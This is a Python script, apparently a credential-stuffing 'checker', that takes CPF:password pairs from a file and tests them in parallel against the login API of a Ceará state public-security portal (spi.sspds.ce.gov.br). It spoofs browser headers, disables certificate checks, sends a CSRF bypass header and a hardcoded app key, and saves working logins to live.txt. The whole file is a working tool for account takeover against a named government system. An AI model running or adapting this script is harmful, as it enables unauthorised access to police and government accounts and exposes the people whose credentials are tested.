import requests
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)
warnings.simplefilter('ignore', InsecureRequestWarning)

class SiaaChecker:
    def __init__(self):
        self.stats = {
            'total': 0,
            'approved': 0,
            'rejected': 0,
            'invalid': 0,
            'errors': 0
        }
        self.start_time = time.time()
        self.session = requests.Session()
        self.live_accounts = []

    def check_login(self, cpf, password):
        login_url = "https://spi.sspds.ce.gov.br/api/siaa/auth"
        headers = {
            "Host": "spi.sspds.ce.gov.br",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            "Csrf-Token": "nocheck",
            "sec-ch-ua-mobile": "?0",
            "X-Requested-With": "*",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://spi.sspds.ce.gov.br",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://spi.sspds.ce.gov.br/oauth2/index.html",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        
        payload = {
            "cpf": cpf,
            "password": password,
            "appServerKey": "46dff8f1542d243a069b86eb95d5108e11a67455"
        }

        try:
            response = self.session.post(
                login_url,
                headers=headers,
                json=payload,
                verify=False,
                timeout=15
            )

            if response.status_code == 200:
                if "token" in response.text:
                    return "APPROVED"
                return "REJECTED"
            return "REJECTED"

        except Exception as e:
            return f"ERROR: {str(e)}"

    def process_line(self, line):
        self.stats['total'] += 1
        
        try:
            cpf, password = line.strip().split(':')
            if not cpf or not password:
                raise ValueError
        except ValueError:
            self.stats['invalid'] += 1
            return None

        result = self.check_login(cpf, password)

        if result == "APPROVED":
            self.stats['approved'] += 1
            self.live_accounts.append(f"{cpf}:{password}")
            return f"{Fore.GREEN}✅ APROVADO | {cpf}:{password}"
        elif result == "REJECTED":
            self.stats['rejected'] += 1
            return f"{Fore.RED}❌ REPROVADO | {cpf}:{password}"
        else:
            self.stats['errors'] += 1
            return f"{Fore.YELLOW}⚠ ERRO | {cpf}:{password} | {result.split(':')[-1]}"

    def show_status(self):
        elapsed = time.time() - self.start_time
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.MAGENTA + "      SPI CHECKER - CALUSH")
        print(Fore.CYAN + "══════════════════════════════════")
        print(f"{Fore.GREEN}✅ live: {self.stats['approved']}")
        print(f"{Fore.RED}❌ die: {self.stats['rejected']}")
        print(f"{Fore.YELLOW}⚠ Erros: {self.stats['errors']}")
        print(f"{Fore.BLUE}📋 Inválidos: {self.stats['invalid']}")
        print(Fore.CYAN + "══════════════════════════════════")
        print(f"{Fore.WHITE}Total: {self.stats['total']}")
        print(f"Tempo: {elapsed:.2f}s")
        print(Fore.CYAN + "══════════════════════════════════")

    def save_results(self):
        if self.live_accounts:
            with open('live.txt', 'w') as f:
                for account in self.live_accounts:
                    cpf, password = account.split(':')
                    f.write(f"LIVE | {cpf}:{password} | CALUSH\n")

def main():
    checker = SiaaChecker()
    
    if not os.path.exists('logins.txt'):
        print(Fore.RED + "Erro: Arquivo 'logins.txt' não encontrado!")
        return

    try:
        with open('logins.txt', 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
        return

    print(Fore.CYAN + "\nIniciando verificação...\n")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(checker.process_line, line): line for line in lines}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)
            checker.show_status()
            time.sleep(0.1)

    checker.save_results()
    print(Fore.GREEN + "\nVerificação concluída! Resultados salvos em live.txt")

if __name__ == "__main__":
    main()